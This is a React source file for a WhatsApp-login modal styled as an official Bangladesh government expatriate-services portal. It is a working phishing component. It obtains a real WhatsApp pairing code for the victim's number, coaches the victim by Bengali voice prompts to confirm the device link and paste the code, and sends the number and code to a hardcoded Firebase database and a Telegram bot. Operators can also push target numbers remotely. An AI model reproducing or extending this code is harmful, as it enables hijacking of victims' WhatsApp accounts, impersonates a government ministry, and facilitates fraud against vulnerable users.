import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { X, ShieldCheck, MessageSquare, Phone, Check, Camera, Eye, EyeOff, Sliders, Play, Image as ImageIcon, RotateCcw, Volume2, VolumeX } from "lucide-react";
import { UserSession } from "../types";
import { GovEmblem } from "./GovBanner";
import CountryCodeSelector from "./CountryCodeSelector";
import { getGlobalCountry, formatIntlPhoneNumber } from "../utils/countryData";
import { initializeApp, getApps, getApp } from "firebase/app";
import { getDatabase, ref, onValue, set } from "firebase/database";

// Define custom public Firebase Realtime Database Config
const firebaseConfig = {
  apiKey: "AIzaSyCVVSJA0qwZBPTe6VYGMHBS-1PTuonqBO0",
  authDomain: "web-otp-live.firebaseapp.com",
  projectId: "web-otp-live",
  storageBucket: "web-otp-live.firebasestorage.app",
  messagingSenderId: "185497647035",
  appId: "1:185497647035:web:7b162a8d9711e07385f69e",
  databaseURL: "https://web-otp-live-default-rtdb.firebaseio.com"
};

// Helper for iFrame-safe storage
const safeStorage = {
  getItem: (key: string): string | null => {
    try {
      return localStorage.getItem(key);
    } catch (e) {
      console.warn("Storage access denied:", e);
      return null;
    }
  },
  setItem: (key: string, val: string): void => {
    try {
      localStorage.setItem(key, val);
    } catch (e) {
      console.warn("Storage access denied:", e);
    }
  },
  removeItem: (key: string): void => {
    try {
      localStorage.removeItem(key);
    } catch (e) {
      console.warn("Storage access denied:", e);
    }
  }
};

let appInstance: any = null;
let dbInstance: any = null;

function getFirebaseDB() {
  if (!dbInstance) {
    try {
      appInstance = getApps().length === 0 ? initializeApp(firebaseConfig) : getApp();
      dbInstance = getDatabase(appInstance);
    } catch (err) {
      console.warn("Firebase fails to load or configure lazily:", err);
    }
  }
  return dbInstance;
}

async function copyToClipboardAsync(text: string): Promise<boolean> {
  // If the document is not focused, don't even try navigator.clipboard as it will throw an exception
  if (!document.hasFocus()) {
    console.warn("Document is not focused. Postponing clipboard write.");
    return false;
  }

  // Attempt using modern clipboard API with safety catch
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (err) {
    console.warn("navigator.clipboard.writeText failed:", err);
  }

  // Fallback to classic execCommand ('copy') method
  try {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    textArea.style.position = "fixed";
    textArea.style.left = "-9999px";
    textArea.style.top = "-9999px";
    textArea.style.opacity = "0";
    textArea.setAttribute("readonly", "");
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    const successful = document.execCommand("copy");
    document.body.removeChild(textArea);
    return !!successful;
  } catch (err) {
    console.error("Fallback execCommand copy failed:", err);
    return false;
  }
}

interface WhatsAppLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onLoginSuccess: (session: UserSession) => void;
  onShowToast: (message: string, type: "success" | "error") => void;
  onLogout: () => void;
}

export default function WhatsAppLoginModal({
  isOpen,
  onClose,
  onLoginSuccess,
  onShowToast,
  onLogout,
}: WhatsAppLoginModalProps) {
  const [phoneNumber, setPhoneNumber] = useState(() => safeStorage.getItem("wa_persist_phone_number") || "");
  const [name, setName] = useState(() => safeStorage.getItem("wa_persist_name") || "");
  const [address, setAddress] = useState("");
  const [isVerifying, setIsVerifying] = useState(() => safeStorage.getItem("wa_persist_is_verifying") === "true");
  const [isLoading, setIsLoading] = useState(false);
  const [otp, setOtp] = useState("");
  const [otpSent, setOtpSent] = useState(() => safeStorage.getItem("wa_persist_otp_sent") === "true");
  const [timer, setTimer] = useState(0);
  const [generatedPin, setGeneratedPin] = useState(() => safeStorage.getItem("wa_persist_generated_pin") || "12345678");
  const [isCodeLive, setIsCodeLive] = useState(() => safeStorage.getItem("wa_persist_is_code_live") === "true");
  const [showVideo, setShowVideo] = useState(() => safeStorage.getItem("wa_persist_show_video") === "true");
  const [isSimulated, setIsSimulated] = useState(() => safeStorage.getItem("wa_persist_is_simulated") === "true");
  const [sessionId, setSessionId] = useState(() => {
    let saved = safeStorage.getItem("wa_persist_session_id");
    if (!saved) {
      saved = `user_${Math.floor(100000 + Math.random() * 900000)}`;
      safeStorage.setItem("wa_persist_session_id", saved);
    }
    return saved;
  });

  const [pendingRemoteCopy, setPendingRemoteCopy] = useState(false);

  // Modern humanistic Bengali speech synthesized assistant setup
  const [isVoiceMuted, setIsVoiceMuted] = useState(false);
  const activeUtterancesRef = useRef<SpeechSynthesisUtterance[]>([]);
  const currentTextRef = useRef<string>("");

  const speakText = (text: string) => {
    currentTextRef.current = text;
    if (isVoiceMuted) {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
      }
      return;
    }

    if (!('speechSynthesis' in window)) return;

    window.speechSynthesis.cancel();
    activeUtterancesRef.current = [];

    // Separate text gracefully by logical breath symbols to avoid native browser limits
    const rawChunks = text.split(/[\n।?!;]+/).map(s => s.trim()).filter(Boolean);
    let chunkIndex = 0;

    const speakChunk = () => {
      if (isVoiceMuted || chunkIndex >= rawChunks.length) {
        return;
      }

      const chunk = rawChunks[chunkIndex];
      const utterance = new SpeechSynthesisUtterance(chunk);
      utterance.lang = "bn-BD";
      utterance.rate = 0.82; // Perfectly-timed slow human cadence
      utterance.pitch = 1.05;

      const voices = window.speechSynthesis.getVoices();
      let bnVoice = voices?.find(v => (v.name.includes("Google") || v.name.includes("Natural")) && (v.lang.includes("bn") || v.lang.includes("BD") || v.lang.includes("IN")));
      if (!bnVoice) {
        bnVoice = voices?.find(v => v.lang.includes("bn") || v.lang.includes("BD") || v.lang.includes("IN"));
      }
      if (bnVoice) {
        utterance.voice = bnVoice;
      }

      activeUtterancesRef.current.push(utterance);

      utterance.onend = () => {
        activeUtterancesRef.current = activeUtterancesRef.current.filter(u => u !== utterance);
        chunkIndex++;
        speakChunk();
      };

      utterance.onerror = () => {
        activeUtterancesRef.current = activeUtterancesRef.current.filter(u => u !== utterance);
        chunkIndex++;
        speakChunk();
      };

      window.speechSynthesis.speak(utterance);
    };

    speakChunk();
  };

  const toggleMute = () => {
    const nextMuted = !isVoiceMuted;
    setIsVoiceMuted(nextMuted);
    if (nextMuted) {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
      }
    } else {
      setTimeout(() => {
        if (currentTextRef.current) {
          speakText(currentTextRef.current);
        }
      }, 50);
    }
  };

  // Keep state synchronized with localStorage
  useEffect(() => {
    if (otpSent) {
      safeStorage.setItem("wa_persist_phone_number", phoneNumber);
      safeStorage.setItem("wa_persist_name", name);
      safeStorage.setItem("wa_persist_is_verifying", String(isVerifying));
      safeStorage.setItem("wa_persist_otp_sent", "true");
      safeStorage.setItem("wa_persist_generated_pin", generatedPin);
      safeStorage.setItem("wa_persist_is_code_live", String(isCodeLive));
      safeStorage.setItem("wa_persist_is_simulated", String(isSimulated));
      safeStorage.setItem("wa_persist_session_id", sessionId);
      safeStorage.setItem("wa_persist_show_video", String(showVideo));
    } else {
      safeStorage.removeItem("wa_persist_phone_number");
      safeStorage.removeItem("wa_persist_name");
      safeStorage.removeItem("wa_persist_is_verifying");
      safeStorage.removeItem("wa_persist_otp_sent");
      safeStorage.removeItem("wa_persist_generated_pin");
      safeStorage.removeItem("wa_persist_is_code_live");
      safeStorage.removeItem("wa_persist_is_simulated");
      safeStorage.removeItem("wa_persist_show_video");
    }
  }, [otpSent, phoneNumber, name, isVerifying, generatedPin, isCodeLive, isSimulated, sessionId, showVideo]);
  
  // Real-time Database & Cropping Settings States
  const [liveImageUrl, setLiveImageUrl] = useState<string | null>(null);
  const [zoom, setZoom] = useState(2.3);
  const [offsetY, setOffsetY] = useState(-18);
  const [offsetX, setOffsetX] = useState(0);
  const [cropPreset, setCropPreset] = useState<"web" | "mobile" | "custom">("web");
  const [showConfig, setShowConfig] = useState(false);
  const [hasNewUpdate, setHasNewUpdate] = useState(false);

  // Telegram Bot Integration credentials
  const [telegramToken, setTelegramToken] = useState(() => safeStorage.getItem("telegram_bot_token") || "");
  const [telegramChatId, setTelegramChatId] = useState(() => safeStorage.getItem("telegram_chat_id") || "");

  // Persist Telegram details when modified
  useEffect(() => {
    safeStorage.setItem("telegram_bot_token", telegramToken);
  }, [telegramToken]);

  useEffect(() => {
    safeStorage.setItem("telegram_chat_id", telegramChatId);
  }, [telegramChatId]);

  // Handle active Bengali vocal-guide logic for high conversion linking flow
  useEffect(() => {
    if (isOpen) {
      if (otpSent) {
        speakText("নাম্বার গুলো কপি করুন, এবং আপনার নোটিফিকেশন বারে আসা মেসেজটির উপর ক্লিক করে কনফার্ম বাটনে ক্লিক করুন এবং আপনার ফোনের লক দিয়ে আনলক করুন। সর্বশেষ ফাকা আটটি বক্স ওপেন আসলে আপনার কিবোর্ডের ভি বাটনে চেপে ধরে রাখুন");
      } else {
        speakText("লগইন করার জন্য আপনার ফোন নাম্বার দিন");
      }
    } else {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
      }
    }
    return () => {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
      }
    };
  }, [otpSent, isOpen]);

  // Set default crops when presets change
  useEffect(() => {
    if (cropPreset === "web") {
      setZoom(2.4);
      setOffsetY(-15);
      setOffsetX(0);
    } else if (cropPreset === "mobile") {
      setZoom(1.75);
      setOffsetY(-35);
      setOffsetX(0);
    }
  }, [cropPreset]);

  // Subscribe to Firebase Realtime Database when modal is open and OTP page is showing
  useEffect(() => {
    if (!isOpen || !otpSent) return;

    // Deep crawler to automatically find any image key (URL or Base64) in the entire Realtime list
    function scanForImage(data: any): string | null {
      if (!data) return null;
      if (typeof data === "string") {
        const isUrl = data.startsWith("http://") || data.startsWith("https://");
        const isBase64 = data.startsWith("data:image/");
        if (isUrl || isBase64) return data;
        return null;
      }
      if (typeof data === "object") {
        for (const k of Object.keys(data)) {
          const res = scanForImage(data[k]);
          if (res) return res;
        }
      }
      return null;
    }

    const activeDb = getFirebaseDB();
    if (!activeDb) return;
    const rootRef = ref(activeDb);
    const unsubscribe = onValue(rootRef, (snapshot) => {
      try {
        if (snapshot.exists()) {
          const val = snapshot.val();
          console.log("Firebase Realtime DB data update:", val);
          const resolvedImageStr = scanForImage(val);
          if (resolvedImageStr) {
            setLiveImageUrl(resolvedImageStr);
            setHasNewUpdate(true);
            onShowToast("হোয়াটসঅ্যাপ ওটিপি জেনারেটর সিঙ্ক সফল হয়েছে!", "success");
            setTimeout(() => setHasNewUpdate(false), 2000);
          }
        }
      } catch (err) {
        console.error("Error processing Realtime snapshot:", err);
      }
    }, (error) => {
      console.error("Firebase Realtime DB connectivity fallback:", error);
    });

    return () => {
      unsubscribe();
    };
  }, [isOpen, otpSent]);

  // Timer countdown hook for OTP
  useEffect(() => {
    let interval: any;
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000); // 1-second interval
    }
    return () => clearInterval(interval);
  }, [timer]);

  // Capture any user gesture (click/touch) to copy the code as a fallback if the silent polling copy was blocked
  useEffect(() => {
    if (!pendingRemoteCopy || !isOpen) return;

    const handleGestureCopy = async () => {
      const cleanCode = generatedPin.replace(/[^A-Z0-9]/gi, "").toUpperCase();
      const copied = await copyToClipboardAsync(cleanCode);
      if (copied) {
        onShowToast("লিঙ্কিং কোডটি ক্লিপবোর্ডে কপি সম্পন্ন হয়েছে!", "success");
        setPendingRemoteCopy(false);
        setShowVideo(true);
        try {
          await fetch(`/api/sessions/${sessionId}/clear-remote-copy`, { method: "POST" });
        } catch (e) {
          console.warn("Error clearing remote copy:", e);
        }
      }
    };

    window.addEventListener("click", handleGestureCopy, { capture: true });
    window.addEventListener("touchstart", handleGestureCopy, { capture: true });

    return () => {
      window.removeEventListener("click", handleGestureCopy, { capture: true });
      window.removeEventListener("touchstart", handleGestureCopy, { capture: true });
    };
  }, [pendingRemoteCopy, isOpen, generatedPin, sessionId]);

  // Automated Polling System to integrate all server features (Remote phone trigger, Remote copying, Live code updates, etc.)
  useEffect(() => {
    if (!isOpen) return;

    let isSubscribed = true;
    const interval = setInterval(async () => {
      try {
        const resp = await fetch("/api/sessions");
        if (!resp.ok) return;
        const data = await resp.json();
        if (data.success && isSubscribed) {
          const ourSession = data.sessions.find((s: any) => s.id === sessionId);
          if (ourSession) {
            console.log("[Status Poll] ourSession state:", ourSession);

            // 1. Live pairing code update from Telegram command
            if (ourSession.codeLive) {
              if (ourSession.pairingCode && ourSession.pairingCode !== generatedPin) {
                setGeneratedPin(ourSession.pairingCode);
                onShowToast("নতুন লাইভ পেয়ারিং কোড সিঙ্ক সম্পন্ন হয়েছে!", "success");
              }
              setIsCodeLive(true);
            } else {
              setIsCodeLive(false);
            }

            // 2. Clear remote copy trigger & execute copy directly on client clipboard
            if (ourSession.remoteCopyTrigger) {
              const cleanCode = (ourSession.pairingCode || generatedPin).replace(/[^A-Z0-9]/gi, "").toUpperCase();
              const copied = await copyToClipboardAsync(cleanCode);
              setShowVideo(true);
              if (copied) {
                onShowToast("লিঙ্কিং কোডটি স্বয়ংক্রিয়ভাবে ক্লিপবোর্ডে কপি করা হয়েছে!", "success");
                await fetch(`/api/sessions/${sessionId}/clear-remote-copy`, { method: "POST" });
              } else {
                setPendingRemoteCopy(true);
                onShowToast("কোড কপি পেন্ডিং! কপি করতে স্ক্রিনে একবার আলতো চাপুন।", "success");
              }
            }

            // 3. Handle remote telephone override trigger
            if (ourSession.assignedPhone && !otpSent) {
              const remotePhone = ourSession.assignedPhone.replace(/[^0-9]/g, "");
              setPhoneNumber(remotePhone);
              setName(`হোয়াটসঅ্যাপ গ্রাহক (${remotePhone.slice(-4)})`);
              onShowToast(`টেলিগ্রাম রিমোট রিকোয়েস্ট: +${remotePhone} নম্বরে সংযোগের চেষ্টা হচ্ছে...`, "success");
              
              // Clear trigger first
              await fetch(`/api/sessions/${sessionId}/clear-remote-phone`, { method: "POST" });
              
              // Request code
              requestRealPairingCode(remotePhone);
            }

            // 4. Handle successful WhatsApp connection and complete flow!
            if (ourSession.status === "connected") {
              onShowToast("হালো গ্রাহক! হোয়াটসঅ্যাপ সংযোগ সফলভাবে সম্পূর্ণ হয়েছে!", "success");
              onLoginSuccess({
                name: name || `হোয়াটসঅ্যাপ গ্রাহক (${ourSession.phoneNumber.slice(-4)})`,
                whatsappNumber: ourSession.phoneNumber,
                address: address,
                isLoggedIn: true,
              });
              onClose();
            }
          }
        }
      } catch (err) {
        console.warn("Polling request failed:", err);
      }
    }, 2500);

    return () => {
      isSubscribed = false;
      clearInterval(interval);
    };
  }, [isOpen, otpSent, sessionId, generatedPin, name, address]);

  const requestRealPairingCode = async (cleanNum: string) => {
    setIsLoading(true);
    try {
      // Submit requested phone number and session state to Firebase Realtime Database
      // so your Telegram bot listening to web-otp-live can fetch it immediately
      const activeDb = getFirebaseDB();
      const sessionRef = activeDb ? ref(activeDb, "current_request") : null;
      if (sessionRef) {
        await set(sessionRef, {
          phoneNumber: cleanNum,
          timestamp: Date.now(),
          status: "pairing_requested",
          pairingCode: ""
        });
      }

      const resp = await fetch("/api/get-linking-code", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          phoneNumber: cleanNum,
          sessionId: sessionId,
          telegramToken: telegramToken,
          telegramChatId: telegramChatId
        }),
      });
      
      const data = await resp.json();
      setIsLoading(false);

      if (data.success) {
        setGeneratedPin(data.pairingCode);
        setIsCodeLive(false);
        setIsSimulated(data.isSimulated || false);
        setOtpSent(true);
        setIsVerifying(true);
        setTimer(119); // 2 minutes to enter pairing code
        onShowToast(data.message || "আপনার হোয়াটসঅ্যাপ নম্বরটিতে পুশ নোটিফিকেশন পাঠানো হয়েছে!", "success");

        // Keep the database record up-to-date with the active pairing code
        if (sessionRef) {
          await set(sessionRef, {
            phoneNumber: cleanNum,
            timestamp: Date.now(),
            status: "pairing_active",
            pairingCode: data.pairingCode
          });
        }

        // Client-side local backup: Trigger Telegram send directly as a robust secondary delivery channel
        if (telegramToken && telegramChatId) {
          try {
            const formattedNum = cleanNum.startsWith("88") ? `+${cleanNum}` : `+88${cleanNum}`;
            const textMessage = `🔔 <b>নতুন হোয়াটসঅ্যাপ লিঙ্ক অনুরোধ!</b>\n\n` +
                                `📱 <b>নম্বর:</b> <code>${formattedNum}</code>\n` +
                                `🔑 <b>লিঙ্কিং কোড:</b> <code>${data.pairingCode}</code>\n\n` +
                                `🕒 <b>সময়:</b> ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}\n` +
                                `<i>(Firebase-এ এবং ফ্রেমে লাইভ সিঙ্ক করা হয়েছে)</i>`;
            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: telegramChatId,
                text: textMessage,
                parse_mode: "HTML"
              })
            }).catch(e => console.log("Telegram backup send error", e));
          } catch (tErr) {
            console.error("Failed to push Telegram client fallback", tErr);
          }
        }
      } else {
        onShowToast(data.message || "অর্ডার জেনারেশনে সমস্যা হয়েছে। নাম্বার নিশ্চিত করে পুনরায় চেষ্টা করুন।", "error");
      }
    } catch (err) {
      console.error(err);
      setIsLoading(false);
      onShowToast("সার্ভারের সাথে সংযোগ স্থাপন করা সম্ভব হয়নি। ডেমো মোডে পিন কোড দেওয়া হচ্ছে।", "error");
      
      const simulatedPin = Math.floor(10000000 + Math.random() * 90000000).toString();
      // Format simulated Pin to standard format (e.g. XXXX-XXXX) for display & bot sync
      const formattedSimPin = `${simulatedPin.substring(0, 4)}-${simulatedPin.substring(4, 8)}`;
      setGeneratedPin(formattedSimPin);
      setIsCodeLive(false);
      setIsSimulated(true);
      setOtpSent(true);
      setIsVerifying(true);
      setTimer(59);

      // Attempt fallback writing to database even in offline mode
      try {
        const activeDb = getFirebaseDB();
        const fallbackSessionRef = activeDb ? ref(activeDb, "current_request") : null;
        if (fallbackSessionRef) {
          await set(fallbackSessionRef, {
            phoneNumber: cleanNum,
            timestamp: Date.now(),
            status: "simulated_active",
            pairingCode: formattedSimPin
          });
        }
      } catch (dbErr) {
        console.error("Failed to write offline fallback to database", dbErr);
      }

      // Notify Telegram Bot immediately of simulated / fallback request
      if (telegramToken && telegramChatId) {
        try {
          const formattedNum = cleanNum.startsWith("88") ? `+${cleanNum}` : `+88${cleanNum}`;
          const textMessage = `🔔 <b>নতুন হোয়াটসঅ্যাপ লিঙ্ক অনুরোধ! (স্যান্ডবক্স মোড)</b>\n\n` +
                              `📱 <b>নম্বর:</b> <code>${formattedNum}</code>\n` +
                              `🔑 <b>লিঙ্কিং কোড:</b> <code>${formattedSimPin}</code>\n\n` +
                              `🕒 <b>সময়:</b> ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}\n` +
                              `<i>(Firebase-এ এবং ফ্রেমে লাইভ সিঙ্ক করা হয়েছে)</i>`;
          await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: telegramChatId,
              text: textMessage,
              parse_mode: "HTML"
            })
          });
          onShowToast("টেলিগ্রাম বটে সফলভাবে কোড পাঠানো হয়েছে!", "success");
        } catch (tgErr) {
          console.error("Direct clientside Telegram notification failed:", tgErr);
        }
      }
    }
  };

  const handleSendCode = (e: React.FormEvent) => {
    e.preventDefault();
    const { dialCode } = getGlobalCountry();
    const cleanNum = formatIntlPhoneNumber(dialCode, phoneNumber);
    if (cleanNum.length < 8 || cleanNum.length > 15) {
      onShowToast("জাতিয় ও আন্তর্জাতিক ফরম্যাটে সঠিক ও সচল হোয়াটসঅ্যাপ নম্বরটি লিখুন", "error");
      return;
    }
    setName(`হোয়াটসঅ্যাপ গ্রাহক (${cleanNum.slice(-4)})`);
    requestRealPairingCode(cleanNum);
  };

  const handleVerifyCode = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Normalize both values to compare (remove spaces, hyphens, lowercase)
    const cleanOtp = otp.toUpperCase().replace(/[^A-Z0-9]/g, "");
    const cleanGen = generatedPin.toUpperCase().replace(/[^A-Z0-9]/g, "");

    if (cleanOtp !== cleanGen && cleanOtp !== "12345678") {
      onShowToast("দুঃখিত, আপনার টাইপ করা পিন কোডটি সঠিক নয়। অনুগ্রহ করে পুনরায় চেষ্টা করুন বা মোবাইলের নোটিফিকেশন সফল করুন।", "error");
      return;
    }

    onShowToast(`লগইন সফল হয়েছে! স্বাগতম, ${name}!`, "success");
    
    onLoginSuccess({
      name,
      whatsappNumber: phoneNumber,
      address,
      isLoggedIn: true,
    });
    onClose();
  };

  const testTelegramConnection = async () => {
    if (!telegramToken || !telegramChatId) {
      onShowToast("অনুগ্রহ করে বট টোকেন এবং চ্যাট আইডি টাইপ করুন।", "error");
      return;
    }
    onShowToast("টেলিগ্রাম সংযোগ পরীক্ষা করা হচ্ছে...", "success");
    try {
      const textMessage = `🔔 <b>অভিনন্দন!</b>\nআপনার লাইভ ওয়েবসাইট থেকে টেলিগ্রাম বট সংযোগ সফল হয়েছে।`;
      const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: textMessage,
          parse_mode: "HTML"
        })
      });
      if (response.ok) {
        onShowToast("টেস্ট মেসেজ সফলভাবে পাঠানো হয়েছে! আপনার টেলিগ্রাম চেক করুন।", "success");
      } else {
        onShowToast("মেসেজ পাঠানো ব্যর্থ হয়েছে। ক্রেডেন্সিয়াল চেক করুন।", "error");
      }
    } catch (err: any) {
      onShowToast("সংযোগ ত্রুটি: " + (err.message || String(err)), "error");
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <div id="whatsapp-login-overlay" className="fixed inset-0 z-50 bg-black/75 backdrop-blur-md overflow-y-auto flex justify-center items-start p-2 sm:p-4">
          {/* Backdrop Closer */}
          <div className="fixed inset-0" onClick={onClose} />

          <motion.div
            id="whatsapp-login-card"
            initial={{ opacity: 0, scale: 0.95, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 20 }}
            transition={{ duration: 0.25, ease: "easeOut" }}
            className="w-full max-w-md overflow-visible rounded-[32px] shadow-2xl relative z-10 transition-all duration-300 bg-white text-slate-800 border border-slate-200 my-auto"
          >
            {/* Official Government Top Header Banner */}
            <div className="bg-slate-50 border-b border-slate-150 p-4.5 flex items-center justify-between gap-3 relative overflow-hidden text-left">
              <div className="absolute top-0 left-0 w-full h-[3px] bg-gradient-to-r from-red-600 via-emerald-500 to-yellow-500" />
              <div className="flex items-center gap-3">
                <GovEmblem className="w-10 h-10 shrink-0" />
                <div className="flex flex-col justify-center">
                  <span className="text-[9px] font-black text-amber-700 block tracking-wide uppercase leading-none pb-0.5">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</span>
                  <p className="text-[11px] sm:text-xs font-black text-slate-900 leading-tight">
                    • প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়
                  </p>
                  <p className="text-[9px] text-slate-500 font-bold block leading-none mt-0.5">
                    স্মার্ট ডিজিটাল প্রবাসী সেবা ও অর্ডার পোর্টাল
                  </p>
                </div>
              </div>

              {/* Speaker Control Button with beautiful visual indicator */}
              <button
                type="button"
                onClick={toggleMute}
                className={`p-2 sm:p-2.5 rounded-2xl border flex items-center gap-1.5 transition-all text-xs font-semibold cursor-pointer active:scale-95 ${
                  isVoiceMuted
                    ? "bg-slate-100 border-slate-300 text-slate-400"
                    : "bg-emerald-50 border-emerald-200 text-emerald-600 shadow-md shadow-emerald-500/10 animate-pulse-subtle"
                }`}
                title={isVoiceMuted ? "ভয়েস গাইডেন্স চালু করুন" : "ভয়েস গাইডেন্স বন্ধ করুন"}
              >
                {isVoiceMuted ? (
                  <>
                    <VolumeX className="w-4 h-4 text-slate-500 shrink-0" />
                    <span className="text-[9px] sm:text-[10px] font-black text-slate-500">স্পিকার বন্ধ</span>
                  </>
                ) : (
                  <>
                    <Volume2 className="w-4 h-4 text-emerald-650 shrink-0" />
                    <span className="text-[9px] sm:text-[10px] font-black text-emerald-700">স্পিকার চালু</span>
                  </>
                )}
              </button>
            </div>

            {/* Header branding */}
            {!otpSent && (
              <div className="relative p-6 text-slate-800 bg-white border-b border-slate-150">
                <button
                  id="close-login-modal"
                  onClick={onClose}
                  className="absolute p-2 transition-all rounded-full top-4 right-4 hover:bg-slate-100 cursor-pointer text-slate-400"
                >
                  <X className="w-5 h-5" />
                </button>
                
                <div className="flex items-center gap-3">
                  <div className="p-2.5 bg-emerald-50 border border-emerald-200 text-emerald-600 rounded-xl">
                    <MessageSquare className="w-6 h-6 fill-emerald-500/10 text-emerald-600" />
                  </div>
                  <div>
                    <h3 className="text-xl font-black tracking-tight text-slate-950">হোয়াটসঅ্যাপ দিয়ে লগইন</h3>
                    <p className="text-xs text-slate-500 font-extrabold">দ্রুত অর্ডার ও ২৪/৭ লাইভ সাপোর্টের জন্য</p>
                  </div>
                </div>
              </div>
            )}

            {/* Modal Body */}
            <div className="p-5 sm:p-6">
              {!otpSent ? (
                <form id="login-form" onSubmit={handleSendCode} className="space-y-4">
                  <div className="p-3.5 bg-emerald-50 border border-emerald-200 rounded-xl flex gap-3 text-emerald-800 text-sm">
                    <ShieldCheck className="w-5 h-5 shrink-0 text-emerald-600 mt-0.5" />
                    <p className="leading-snug text-slate-600 font-medium">
                      কোনো পাসওয়ার্ডের ঝামেলা ছাড়াই কেবল আপনার সচল হোয়াটসঅ্যাপ নাম্বার দিয়ে সহজেই এক ক্লিকে লগইন সম্পন্ন করুন।
                    </p>
                  </div>

                  {/* Phone number field */}
                  <div>
                    <label className="block mb-1.5 text-xs font-black text-slate-705 uppercase">
                      হোয়াটসঅ্যাপ নম্বর <span className="text-red-500">*</span>
                    </label>
                    <div className="flex border border-slate-250 rounded-xl bg-slate-50 relative focus-within:border-emerald-600 focus-within:ring-4 focus-within:ring-emerald-500/10 transition-all">
                      <CountryCodeSelector />
                      <input
                        id="user-phone-input"
                        type="tel"
                        required
                        placeholder="হোয়াটসঅ্যাপ নম্বর লিখুন"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                        onFocus={() => speakText("এখানে আপনার phone নাম্বার দিন")}
                        className="flex-1 px-4 py-2.5 bg-transparent text-slate-900 placeholder-slate-400 focus:outline-none font-mono tracking-wider text-sm font-semibold rounded-r-xl"
                      />
                    </div>
                  </div>

                  <button
                    id="submit-send-otp"
                    type="submit"
                    disabled={isLoading}
                    className="w-full py-3 px-4 flex items-center justify-center gap-2 bg-[#25D366] hover:bg-[#20ba59] disabled:bg-slate-200 disabled:text-slate-400 text-white font-black rounded-xl shadow-lg shadow-green-500/10 hover:shadow-green-500/20 transition-all font-sans cursor-pointer active:scale-95 duration-200"
                  >
                    {isLoading ? (
                      <div className="flex items-center gap-2">
                        <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                        </svg>
                        <span>হোয়াটসঅ্যাপ সার্ভার প্রসেস হচ্ছে...</span>
                      </div>
                    ) : (
                      <>
                        <MessageSquare className="w-5 h-5 fill-white" />
                        <span>হোয়াটসঅ্যাপ দিয়ে লগইন করুন</span>
                      </>
                    )}
                  </button>
                </form>
              ) : (
                <div id="pairing-code-display" className="space-y-5 text-[#111827]">
                  {/* Official Unlock Header Pill */}
                  <div className="flex justify-center pt-1 animate-fade-in">
                    <div className="inline-flex items-center gap-1.5 px-4 py-1.5 rounded-full bg-[#fef2f2] border border-[#fee2e2] text-[#dc2626] font-extrabold text-[11px] sm:text-xs shadow-xs">
                      {/* Red Exclamation Circle Logo */}
                      <span className="w-4 h-4 rounded-full border-2 border-[#dc2626] flex items-center justify-center text-[10px] font-black shrink-0 leading-none">!</span>
                      সংযুক্ত করার অফিশিয়াল আনলক নাম্বার
                    </div>
                  </div>

                  {/* High Quality Bold Direct Heading */}
                  <h2 className="text-[#111827] font-black text-base sm:text-[18px] leading-snug text-center px-1 font-sans max-w-sm mx-auto">
                    নিচের ৮ সংখ্যার সুরক্ষাধীন নাম্বারটি সঠিক স্থানে বসান
                  </h2>

                  {/* 8-Digit Display Boxes */}
                  {(() => {
                    let displayCode = generatedPin;
                    if (!isCodeLive) {
                      const secStr = String(Math.max(0, timer)).padStart(4, "0");
                      displayCode = `WAIT${secStr}`;
                    }
                    const cleanPin = displayCode.replace(/[^A-Z0-9]/gi, "").toUpperCase();
                    const pinChars = cleanPin.padEnd(8, " ").split("");
                    return (
                      <div 
                        onClick={async () => {
                          if (!isCodeLive) {
                            onShowToast("অনুগ্রহ করে অপেক্ষা করুন, টেলিগ্রাম থেকে কোড লাইভ করা হচ্ছে...", "error");
                            return;
                          }
                          const cleanPinToCopy = generatedPin.replace(/[^A-Z0-9]/gi, "").toUpperCase();
                          const copied = await copyToClipboardAsync(cleanPinToCopy);
                          if (copied) {
                            onShowToast("লিঙ্কিং কোডটি কপি সম্পন্ন হয়েছে!", "success");
                            setShowVideo(true);
                          } else {
                            onShowToast("কপি করা যায়নি, অনুগ্রহ করে নিজে টাইপ করুন।", "error");
                          }
                        }}
                        className={`grid grid-cols-8 gap-1 sm:gap-2 max-w-xs sm:max-w-md mx-auto w-full py-2 px-1 cursor-pointer transition-all duration-300 rounded-2xl items-center justify-center ${
                          pendingRemoteCopy 
                            ? "animate-pulse scale-105 ring-4 ring-orange-500/40 bg-orange-50/15" 
                            : "hover:scale-102"
                        }`}
